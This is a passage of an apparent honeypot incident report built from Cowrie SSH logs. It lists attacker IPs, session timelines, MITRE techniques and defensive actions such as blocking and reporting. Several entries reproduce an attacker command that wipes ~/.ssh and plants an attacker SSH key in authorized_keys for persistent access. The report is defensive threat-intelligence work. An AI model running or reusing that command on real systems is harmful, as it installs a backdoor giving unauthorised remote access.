| Field | Detail |
|---|---|
| **Source IP** | `36.189.207[.]209` |
| **First Seen** | 2026-06-30 03:48 |
| **Last Seen** | 2026-06-30 03:50 |
| **Session Duration** | 105s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:48:31` | `cowrie.session.connect` |
| `2026-06-30 03:48:31` | `cowrie.client.version` |
| `2026-06-30 03:48:32` | `cowrie.client.kex` |
| `2026-06-30 03:48:33` | `cowrie.login.success` |
| `2026-06-30 03:50:16` | `cowrie.session.file_upload` |
| `2026-06-30 03:50:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.189.207[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.189.207[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f84a02f9ec8

| Field | Detail |
|---|---|
| **Source IP** | `223.109.141[.]9` |
| **First Seen** | 2026-06-30 03:48 |
| **Last Seen** | 2026-06-30 03:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:48:36` | `cowrie.session.connect` |
| `2026-06-30 03:48:36` | `cowrie.client.version` |
| `2026-06-30 03:48:36` | `cowrie.client.kex` |
| `2026-06-30 03:48:37` | `cowrie.login.success` |
| `2026-06-30 03:48:38` | `cowrie.session.params` |
| `2026-06-30 03:48:38` | `cowrie.command.input` |
| `2026-06-30 03:48:38` | `cowrie.command.failed` |
| `2026-06-30 03:48:39` | `cowrie.log.closed` |
| `2026-06-30 03:48:39` | `cowrie.session.params` |
| `2026-06-30 03:48:39` | `cowrie.command.input` |
| `2026-06-30 03:48:40` | `cowrie.session.file_download` |
| `2026-06-30 03:48:40` | `cowrie.log.closed` |
| `2026-06-30 03:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.109.141[.]9` to AbuseIPDB if not already reported
- [ ] Block `223.109.141[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f49d028e7ffd

| Field | Detail |
|---|---|
| **Source IP** | `223.109.141[.]9` |
| **First Seen** | 2026-06-30 03:48 |
| **Last Seen** | 2026-06-30 03:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:48:40` | `cowrie.session.connect` |
| `2026-06-30 03:48:40` | `cowrie.client.version` |
| `2026-06-30 03:48:40` | `cowrie.client.kex` |
| `2026-06-30 03:48:41` | `cowrie.login.success` |
| `2026-06-30 03:48:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.109.141[.]9` to AbuseIPDB if not already reported
- [ ] Block `223.109.141[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25d77ad7e3a0

| Field | Detail |
|---|---|
| **Source IP** | `223.109.141[.]9` |
| **First Seen** | 2026-06-30 03:48 |
| **Last Seen** | 2026-06-30 03:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:48:42` | `cowrie.session.connect` |
| `2026-06-30 03:48:42` | `cowrie.client.version` |
| `2026-06-30 03:48:42` | `cowrie.client.kex` |
| `2026-06-30 03:48:43` | `cowrie.login.success` |
| `2026-06-30 03:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.109.141[.]9` to AbuseIPDB if not already reported
- [ ] Block `223.109.141[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7d1f09322c0

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-30 03:53 |
| **Last Seen** | 2026-06-30 03:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:53:48` | `cowrie.session.connect` |
| `2026-06-30 03:53:48` | `cowrie.client.version` |
| `2026-06-30 03:53:48` | `cowrie.client.kex` |
| `2026-06-30 03:53:49` | `cowrie.login.success` |
| `2026-06-30 03:53:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-232e1d329d72

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-30 03:53 |
| **Last Seen** | 2026-06-30 03:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:53:48` | `cowrie.session.connect` |
| `2026-06-30 03:53:48` | `cowrie.client.version` |
| `2026-06-30 03:53:48` | `cowrie.client.kex` |
| `2026-06-30 03:53:49` | `cowrie.login.success` |
| `2026-06-30 03:53:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73022e9420e7

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 03:55 |
| **Last Seen** | 2026-06-30 03:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:55:14` | `cowrie.session.connect` |
| `2026-06-30 03:55:14` | `cowrie.client.version` |
| `2026-06-30 03:55:14` | `cowrie.client.kex` |
| `2026-06-30 03:55:16` | `cowrie.login.success` |
| `2026-06-30 03:55:17` | `cowrie.session.params` |
| `2026-06-30 03:55:17` | `cowrie.command.input` |
| `2026-06-30 03:55:18` | `cowrie.log.closed` |
| `2026-06-30 03:55:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a96f232402f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-30 03:55 |
| **Last Seen** | 2026-06-30 03:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:55:28` | `cowrie.session.connect` |
| `2026-06-30 03:55:28` | `cowrie.client.version` |
| `2026-06-30 03:55:28` | `cowrie.client.kex` |
| `2026-06-30 03:55:28` | `cowrie.login.success` |
| `2026-06-30 03:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75457f0c1be9

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-30 03:55 |
| **Last Seen** | 2026-06-30 03:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:55:28` | `cowrie.session.connect` |
| `2026-06-30 03:55:28` | `cowrie.client.version` |
| `2026-06-30 03:55:28` | `cowrie.client.kex` |
| `2026-06-30 03:55:28` | `cowrie.login.success` |
| `2026-06-30 03:55:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f11b3cf7143

| Field | Detail |
|---|---|
| **Source IP** | `14.103.64[.]177` |
| **First Seen** | 2026-06-30 03:55 |
| **Last Seen** | 2026-06-30 04:00 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:55:34` | `cowrie.session.connect` |
| `2026-06-30 03:55:34` | `cowrie.client.version` |
| `2026-06-30 03:55:35` | `cowrie.client.kex` |
| `2026-06-30 03:55:36` | `cowrie.login.success` |
| `2026-06-30 03:55:37` | `cowrie.session.params` |
| `2026-06-30 03:55:37` | `cowrie.command.input` |
| `2026-06-30 03:55:37` | `cowrie.command.failed` |
| `2026-06-30 03:55:37` | `cowrie.log.closed` |
| `2026-06-30 03:55:38` | `cowrie.session.params` |
| `2026-06-30 03:55:38` | `cowrie.command.input` |
| `2026-06-30 04:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.64[.]177` to AbuseIPDB if not already reported
- [ ] Block `14.103.64[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a806942c3d4a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 03:55 |
| **Last Seen** | 2026-06-30 03:55 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:55:42` | `cowrie.session.connect` |
| `2026-06-30 03:55:44` | `cowrie.client.version` |
| `2026-06-30 03:55:44` | `cowrie.client.kex` |
| `2026-06-30 03:55:50` | `cowrie.login.success` |
| `2026-06-30 03:55:53` | `cowrie.session.params` |
| `2026-06-30 03:55:53` | `cowrie.command.input` |
| `2026-06-30 03:55:54` | `cowrie.log.closed` |
| `2026-06-30 03:55:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b49fc63d3f07

| Field | Detail |
|---|---|
| **Source IP** | `157.10.160[.]213` |
| **First Seen** | 2026-06-30 04:00 |
| **Last Seen** | 2026-06-30 04:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:00:21` | `cowrie.session.connect` |
| `2026-06-30 04:00:21` | `cowrie.client.version` |
| `2026-06-30 04:00:21` | `cowrie.client.kex` |
| `2026-06-30 04:00:22` | `cowrie.login.success` |
| `2026-06-30 04:00:23` | `cowrie.session.params` |
| `2026-06-30 04:00:23` | `cowrie.command.input` |
| `2026-06-30 04:00:23` | `cowrie.command.failed` |
| `2026-06-30 04:00:24` | `cowrie.log.closed` |
| `2026-06-30 04:00:25` | `cowrie.session.params` |
| `2026-06-30 04:00:25` | `cowrie.command.input` |
| `2026-06-30 04:00:25` | `cowrie.session.file_download` |
| `2026-06-30 04:00:25` | `cowrie.log.closed` |
| `2026-06-30 04:00:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.10.160[.]213` to AbuseIPDB if not already reported
- [ ] Block `157.10.160[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62144eb69920

| Field | Detail |
|---|---|
| **Source IP** | `157.10.160[.]213` |
| **First Seen** | 2026-06-30 04:00 |
| **Last Seen** | 2026-06-30 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:00:25` | `cowrie.session.connect` |
| `2026-06-30 04:00:25` | `cowrie.client.version` |
| `2026-06-30 04:00:26` | `cowrie.client.kex` |
| `2026-06-30 04:00:27` | `cowrie.login.success` |
| `2026-06-30 04:00:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.10.160[.]213` to AbuseIPDB if not already reported
- [ ] Block `157.10.160[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3af3985f828a

| Field | Detail |
|---|---|
| **Source IP** | `157.10.160[.]213` |
| **First Seen** | 2026-06-30 04:00 |
| **Last Seen** | 2026-06-30 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:00:27` | `cowrie.session.connect` |
| `2026-06-30 04:00:27` | `cowrie.client.version` |
| `2026-06-30 04:00:27` | `cowrie.client.kex` |
| `2026-06-30 04:00:28` | `cowrie.login.success` |
| `2026-06-30 04:00:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.10.160[.]213` to AbuseIPDB if not already reported
- [ ] Block `157.10.160[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a225f1387ad

| Field | Detail |
|---|---|
| **Source IP** | `203.88.119[.]100` |
| **First Seen** | 2026-06-30 04:03 |
| **Last Seen** | 2026-06-30 04:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:03:00` | `cowrie.session.connect` |
| `2026-06-30 04:03:00` | `cowrie.client.version` |
| `2026-06-30 04:03:00` | `cowrie.client.kex` |
| `2026-06-30 04:03:00` | `cowrie.login.success` |
| `2026-06-30 04:03:01` | `cowrie.session.params` |
| `2026-06-30 04:03:01` | `cowrie.command.input` |
| `2026-06-30 04:03:01` | `cowrie.command.failed` |
| `2026-06-30 04:03:01` | `cowrie.log.closed` |
| `2026-06-30 04:03:02` | `cowrie.session.params` |
| `2026-06-30 04:03:02` | `cowrie.command.input` |
| `2026-06-30 04:03:02` | `cowrie.session.file_download` |
| `2026-06-30 04:03:02` | `cowrie.log.closed` |
| `2026-06-30 04:03:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.88.119[.]100` to AbuseIPDB if not already reported
- [ ] Block `203.88.119[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f7284276571

| Field | Detail |
|---|---|
| **Source IP** | `203.88.119[.]100` |
| **First Seen** | 2026-06-30 04:03 |
| **Last Seen** | 2026-06-30 04:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:03:02` | `cowrie.session.connect` |
| `2026-06-30 04:03:02` | `cowrie.client.version` |
| `2026-06-30 04:03:02` | `cowrie.client.kex` |
| `2026-06-30 04:03:03` | `cowrie.login.success` |
| `2026-06-30 04:03:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.88.119[.]100` to AbuseIPDB if not already reported
- [ ] Block `203.88.119[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e68ec84e3686

| Field | Detail |
|---|---|
| **Source IP** | `203.88.119[.]100` |
| **First Seen** | 2026-06-30 04:03 |
| **Last Seen** | 2026-06-30 04:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:03:03` | `cowrie.session.connect` |
| `2026-06-30 04:03:03` | `cowrie.client.version` |
| `2026-06-30 04:03:03` | `cowrie.client.kex` |
| `2026-06-30 04:03:03` | `cowrie.login.success` |
| `2026-06-30 04:03:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.88.119[.]100` to AbuseIPDB if not already reported
- [ ] Block `203.88.119[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-059bc841a460

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-06-30 04:04 |
| **Last Seen** | 2026-06-30 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:04:28` | `cowrie.session.connect` |
| `2026-06-30 04:04:28` | `cowrie.client.version` |
| `2026-06-30 04:04:28` | `cowrie.client.kex` |
| `2026-06-30 04:04:29` | `cowrie.login.success` |
| `2026-06-30 04:04:29` | `cowrie.session.params` |
| `2026-06-30 04:04:29` | `cowrie.command.input` |
| `2026-06-30 04:04:29` | `cowrie.log.closed` |
| `2026-06-30 04:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15ea0a28f901

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 04:07 |
| **Last Seen** | 2026-06-30 04:08 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:07:56` | `cowrie.session.connect` |
| `2026-06-30 04:07:57` | `cowrie.client.version` |
| `2026-06-30 04:07:57` | `cowrie.client.kex` |
| `2026-06-30 04:08:04` | `cowrie.login.success` |
| `2026-06-30 04:08:07` | `cowrie.session.params` |
| `2026-06-30 04:08:07` | `cowrie.command.input` |
| `2026-06-30 04:08:08` | `cowrie.log.closed` |
| `2026-06-30 04:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85b769be3f4b

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 04:10 |
| **Last Seen** | 2026-06-30 04:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:10:19` | `cowrie.session.connect` |
| `2026-06-30 04:10:19` | `cowrie.client.version` |
| `2026-06-30 04:10:19` | `cowrie.client.kex` |
| `2026-06-30 04:10:20` | `cowrie.login.success` |
| `2026-06-30 04:10:22` | `cowrie.session.params` |
| `2026-06-30 04:10:22` | `cowrie.command.input` |
| `2026-06-30 04:10:23` | `cowrie.log.closed` |
| `2026-06-30 04:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df5b4db81c67

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-06-30 04:10 |
| **Last Seen** | 2026-06-30 04:11 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which htop` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:10:58` | `cowrie.session.connect` |
| `2026-06-30 04:11:01` | `cowrie.client.version` |
| `2026-06-30 04:11:01` | `cowrie.client.kex` |
| `2026-06-30 04:11:15` | `cowrie.login.success` |
| `2026-06-30 04:11:23` | `cowrie.session.params` |
| `2026-06-30 04:11:23` | `cowrie.command.input` |
| `2026-06-30 04:11:26` | `cowrie.log.closed` |
| `2026-06-30 04:11:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-223c5466b37c

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-06-30 04:11 |
| **Last Seen** | 2026-06-30 04:12 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which htop` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:11:55` | `cowrie.session.connect` |
| `2026-06-30 04:11:58` | `cowrie.client.version` |
| `2026-06-30 04:11:58` | `cowrie.client.kex` |
| `2026-06-30 04:12:17` | `cowrie.login.success` |
| `2026-06-30 04:12:24` | `cowrie.session.params` |
| `2026-06-30 04:12:24` | `cowrie.command.input` |
| `2026-06-30 04:12:29` | `cowrie.log.closed` |
| `2026-06-30 04:12:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49eacef38e0d

| Field | Detail |
|---|---|
| **Source IP** | `193.233.48[.]169` |
| **First Seen** | 2026-06-30 04:12 |
| **Last Seen** | 2026-06-30 04:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:12:20` | `cowrie.session.connect` |
| `2026-06-30 04:12:20` | `cowrie.client.version` |
| `2026-06-30 04:12:20` | `cowrie.client.kex` |
